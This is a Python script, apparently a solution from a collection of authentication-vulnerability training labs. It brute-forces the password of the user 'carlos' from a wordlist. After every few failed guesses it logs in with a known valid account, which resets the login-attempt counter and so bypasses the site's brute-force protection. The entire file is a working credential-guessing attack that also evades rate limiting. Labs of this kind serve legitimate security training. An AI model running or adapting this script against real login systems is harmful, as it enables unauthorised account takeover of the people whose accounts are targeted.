"""
Author: Kien Do
Source: https://github.com/kienmarkdo/Authentication-Vulnerabilities-Labs
"""

from time import sleep
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def check_url_exists(url):
    res = requests.get(url, verify=False, proxies=proxies)
    if "<h1>Error</h1><p>Stream&#32;failed&#32;to&#32;close&#32;correctly</p>" in res.text:
        print("[-] ERROR: The webpage you are requesting does not exist...")
        exit(-1) # exit program

def find_password_login(base_url, passwords_str):

    password_extracted = ""
    attempt_counter = 0

    print("[+] Determining Carlos' password via enumeration... Please wait patiently as the script runs.")

    # initial login to get the session cookie
    s = requests.Session()
    r = s.post(base_url + "/login", verify=False, proxies=proxies, data="username=%s&password=%s" %("wiener", "peter"))
    cookies = r.cookies

    sleep(1)

    # enumerate 2 times then login with valid credentials then logout. Rinse and repeat.
    for password in passwords_str:

        # login with wiener:peter to reset the login attempt counter, if required, before proceeding
        if attempt_counter > 2:

            s = requests.Session()
            r = s.post(base_url + "/login", verify=False, proxies=proxies, data="username=%s&password=%s" %("wiener", "peter"))
            cookies = r.cookies

            sleep(1)

            attempt_counter = 0 # reset counter

        # try a password from the passwords list on username "carlos"
        r = s.post(base_url + "/login", verify=False, proxies=proxies, cookies=cookies,
                          data="username=%s&password=%s" %("carlos", password)) # attempt next password from list
        attempt_counter += 1 # increment counter

        if "Log out" in r.text: # found password
            password_extracted = password
            break

    return password_extracted

def main():
    
    # verify script parameters
    if len(sys.argv) != 2:
        print('[+] Usage: %s "<url>"' % sys.argv[0])
        print('[+] Example: %s "www.example.com"' % sys.argv[0])
        exit(-1)
    
    # read the given usernames and passwords lists into string variables
    passwords_str = open("passwords_list.txt", "r").read().splitlines()

    # extract url of webpage and verify that the url exists (webpage has not expired)
    base_url = sys.argv[1]
    password_extracted = ""

    check_url_exists(base_url)

    # extract password and login
    password_extracted = find_password_login(base_url, passwords_str)
    if password_extracted == "":
        print("[-] Failed to find carlos' password...")
        exit(-1)
    else:
        print("[+] Found carlos' password succesfully: " + password_extracted)

if __name__ == "__main__":
    main()